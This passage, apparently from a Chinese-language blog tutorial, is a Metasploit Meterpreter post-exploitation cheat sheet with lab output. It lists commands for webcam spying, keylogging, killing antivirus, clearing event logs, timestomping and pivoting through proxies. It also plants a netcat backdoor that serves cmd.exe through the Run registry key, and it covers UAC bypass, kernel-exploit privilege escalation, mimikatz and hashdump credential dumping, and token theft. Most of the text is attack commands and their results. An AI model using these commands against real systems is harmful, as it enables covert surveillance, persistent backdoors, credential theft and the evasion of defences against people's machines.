class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"># 会话管理</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">sessions  # 查看会话</span><br><span class="line">sessions -i  # 切换会话</span><br><span class="line">quit  # 关闭当前的会话，返回msf终端</span><br><span class="line"></span><br><span class="line"># 系统设置</span><br><span class="line">sysinfo  # 查看目标机系统信息</span><br><span class="line">idletime  # 查看目标机闲置时间</span><br><span class="line">reboot/shutdown   # 重启/关机</span><br><span class="line"></span><br><span class="line"># shell</span><br><span class="line">shell  # 获得控制台权限</span><br><span class="line">irb  # 进入ruby终端</span><br><span class="line"></span><br><span class="line"># 进程迁移</span><br><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line"></span><br><span class="line"># 执行文件</span><br><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br><span class="line"></span><br><span class="line"># 摄像头命令</span><br><span class="line">webcam_list  #查看摄像头列表</span><br><span class="line">webcam_chat  # 查看摄像头接口</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br><span class="line"></span><br><span class="line"># uictl开关键盘/鼠标</span><br><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br><span class="line"></span><br><span class="line"># 远程桌面/截屏</span><br><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br><span class="line"></span><br><span class="line"># 键盘记录</span><br><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br><span class="line"></span><br><span class="line"># 添加用户，开启远程桌面</span><br><span class="line"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br><span class="line"></span><br><span class="line"># 关闭防病毒软件</span><br><span class="line">run killav</span><br><span class="line">run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line"># 修改注册表</span><br><span class="line">reg –h # 注册表命令帮助</span><br><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line">nc -v 192.168.81.162 443  #攻击者连接nc后门</span><br><span class="line"></span><br><span class="line"># 清理日志</span><br><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure>

<h3 id="4-2-文件系统命令-2"><a href="#4-2-文件系统命令-2" class="headerlink" title="4.2 文件系统命令"></a>4.2 文件系统命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat/ls/cd/rm  # 基本命令</span><br><span class="line">search -f *pass* -d C:\\windows # 搜索文件  -h查看帮助</span><br><span class="line">getwd/pwd  # 获取当前目录</span><br><span class="line">getlwd/lpwd   # 操作攻击者主机 查看当前目录</span><br><span class="line">upload /tmp/hack.txt C:\\lltest # 上传文件</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/  # 下载文件</span><br><span class="line">edit c:\\1.txt  # 编辑或创建文件  没有的话，会新建文件</span><br><span class="line">mkdir lltest2  # 只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  # 只能删除当前目录下文件夹</span><br><span class="line">lcd /tmp   # 操作攻击者主机 切换目录</span><br><span class="line"></span><br><span class="line"># timestomp伪造文件时间戳</span><br><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure>

<h3 id="4-3-网络命令-2"><a href="#4-3-网络命令-2" class="headerlink" title="4.3 网络命令"></a>4.3 网络命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># 基本</span><br><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br><span class="line"></span><br><span class="line"># portfwd端口转发</span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 # 将目标机的3389端口转发到本地6666端口</span><br><span class="line">rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 #然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 添加路由</span><br><span class="line"></span><br><span class="line"># 方式一autoroute （deprecated）</span><br><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.2.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br><span class="line"># 方式二post/multi/manage/autoroute</span><br><span class="line">run post/multi/manage/autoroute CMD=autoadd #自动添加到目标环境网络</span><br><span class="line">run post/multi/manage/autoroute CMD=print # 查看添加的路由</span><br><span class="line">(Specify the autoroute command (Accepted: add, autoadd, print, delete, default))</span><br><span class="line"></span><br><span class="line"># 然后可以利用arp_scanner、portscan等进行扫描</span><br><span class="line">run arp_scanner -r 192.168.2.0/24</span><br><span class="line">run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0</span><br><span class="line"></span><br><span class="line"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span><br><span class="line"># msf提供了2个模块用来做socks代理。</span><br><span class="line"># auxiliary/server/socks_proxy</span><br><span class="line"># use auxiliary/server/socks_unc</span><br><span class="line"># 先background退出来，然后：</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set srvport 1080</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span><br><span class="line"># 最后proxychains 使用Socks5代理访问</span><br><span class="line"></span><br><span class="line"># sniffer抓包</span><br><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure>

<h3 id="4-4-信息收集-2"><a href="#4-4-信息收集-2" class="headerlink" title="4.4 信息收集"></a>4.4 信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 信息收集的脚本位于：</span><br><span class="line"># modules/post/windows/gather</span><br><span class="line"># modules/post/linux/gather</span><br><span class="line"># 以下列举一些常用的</span><br><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure>

<h3 id="4-5-提权-2"><a href="#4-5-提权-2" class="headerlink" title="4.5 提权"></a>4.5 提权</h3>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem  </span><br></pre></td></tr></table></figure>

2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。msf提供了如下几个模块帮助绕过UAC：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(server/socks5) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>

使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># 示例</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: SAUCERMAN\TideSec</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; set SESSION 4</span><br><span class="line">SESSION =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (206403 bytes) to 192.168.81.154</span><br><span class="line">[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700</span><br><span class="line">[-] Exploit failed [timeout-expired]: Timeout::Error execution expired</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span><br><span class="line"># 然鹅这里失败了</span><br></pre></td></tr></table></figure>

3.内核漏洞提权无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf5 &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf5 &gt; set SESSION 2</span><br><span class="line">msf5 &gt; exploit</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 4...</span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; search MS13-081</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                             Disclosure Date  Rank     Check  Description</span><br><span class="line">   -  ----                                             ---------------  ----     -----  -----------</span><br><span class="line">   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; set session 4</span><br><span class="line">session =&gt; 4</span><br><span class="line">msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit</span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module.</span><br><span class="line">[-] Handler failed to bind to 192.168.81.160:4444:-  -</span><br><span class="line">[-] Handler failed to bind to 0.0.0.0:4444:-  -</span><br><span class="line">[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"># 然鹅失败了，摸摸头</span><br></pre></td></tr></table></figure>

<h3 id="4-6-获取凭证-2"><a href="#4-6-获取凭证-2" class="headerlink" title="4.6 获取凭证"></a>4.6 获取凭证</h3>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。1.使用mimikatz<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &#x27;load kiwi&#x27; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[!] Not currently running as SYSTEM</span><br><span class="line">[*] Attempting to getprivs ...</span><br><span class="line">[+] Got SeDebugPrivilege.</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain        User           Password</span><br><span class="line">------    -------    ------        ----           --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  </span><br><span class="line">0;996     Negotiate  WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;48748   NTLM                                    </span><br><span class="line">0;999     NTLM       WORKGROUP     SAUCERMAN$     </span><br><span class="line">0;476238  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line">0;476209  NTLM       SAUCERMAN     TideSec        123456</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : saucerman</span><br><span class="line">BootKey    : 691cff33caf49e933be97fcee370256a</span><br><span class="line">RegOpenKeyEx SAM : (0x00000005) �ݿ� </span><br><span class="line">Erreur lors de l&#x27;exploration du registremeterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>使用meterpreter的run hashdump命令</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run hashdump</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.</span><br><span class="line">[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">TideSec:&quot;123456&quot;</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

3.post/windows/gather/smart_hashdump从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against SAUCERMAN</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...</span><br><span class="line">[*]     Obtaining the user list and keys...</span><br><span class="line">[*]     Decrypting user keys...</span><br><span class="line">[*]     Dumping password hints...</span><br><span class="line">[+]     TideSec:&quot;123456&quot;</span><br><span class="line">[*]     Dumping password hashes...</span><br><span class="line">[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::</span><br></pre></td></tr></table></figure>

4.powerdump<br>同 hashdump，但失败了<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run powerdump</span><br><span class="line">[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Running PowerDump to extract Username and Password Hashes...</span><br><span class="line">[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...</span><br><span class="line">[*] Setting ExecutionPolicy to Unrestricted...</span><br><span class="line">[*] Dumping the SAM database through PowerShell...</span><br><span class="line"></span><br><span class="line">[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.</span><br></pre></td></tr></table></figure>

<h3 id="4-7-假冒令牌-2"><a href="#4-7-假冒令牌-2" class="headerlink" title="4.7 假冒令牌"></a>4.7 假冒令牌</h3>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 1.incognito假冒令牌</span><br><span class="line">use incognito      #help incognito  查看帮助</span><br><span class="line">list_tokens -u    #查看可用的token</span><br><span class="line">impersonate_token &#x27;NT AUTHORITY\SYSTEM&#x27;  #假冒SYSTEM token</span><br><span class="line">或者impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\</span><br><span class="line">execute -f cmd.exe -i –t    # -t 使用假冒的token 执行</span><br><span class="line">或者直接shell</span><br><span class="line">rev2self   #返回原始token</span><br><span class="line"></span><br><span class="line"># 2.steal_token窃取令牌</span><br><span class="line">steal_token &lt;pid值&gt;   #从指定进程中窃取token   先ps</span><br><span class="line">drop_token  #删除窃取的token</span><br></pre></td></tr></table></figure>

